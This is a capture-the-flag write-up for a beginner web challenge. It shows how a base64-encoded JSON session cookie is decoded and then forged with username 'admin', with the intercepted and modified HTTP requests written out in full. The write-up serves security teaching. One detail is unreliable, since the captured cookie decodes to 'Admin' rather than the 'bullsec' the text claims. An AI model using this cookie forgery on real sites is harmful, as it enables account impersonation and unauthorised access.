# Baby Auth

Really simple Authentication based challenge.

Create a new account with any old username, doesn't really matter, and get yourself logged in.

---

If we intercept the response from the webserver we get the following:

```bash
GET / HTTP/1.1
Host: 206.189.117.48:31943
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://206.189.117.48:31943/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=eyJ1c2VybmFtZSI6IkFkbWluIn0%3D
Connection: close

```

Note the `PHPSESSID` is a base64 encoded block, and also note the first 3 characters are `eyJ` which is a pretty good signifier that we're dealing with a JSON blob once it's decoded.

```bash
# Manually change the %3D into an = character first to save effort
base64 -d cookie
{"username":"bullsec"}
```

If we simply make a new JSON blob with and change the value from `bullsec` to `admin` then we'll be able to grab the flag:

```
# Create our new cookie
echo '{"username":"admin"}' | base64
eyJ1c2VybmFtZSI6ImFkbWluIn0K
```

Then we just need to replace the value of `PHPSESSID` with the one we've just created and we get the flag:

```bash
GET / HTTP/1.1
Host: 206.189.117.48:31943
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://206.189.117.48:31943/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=eyJ1c2VybmFtZSI6ImFkbWluIn0K
Connection: close

```

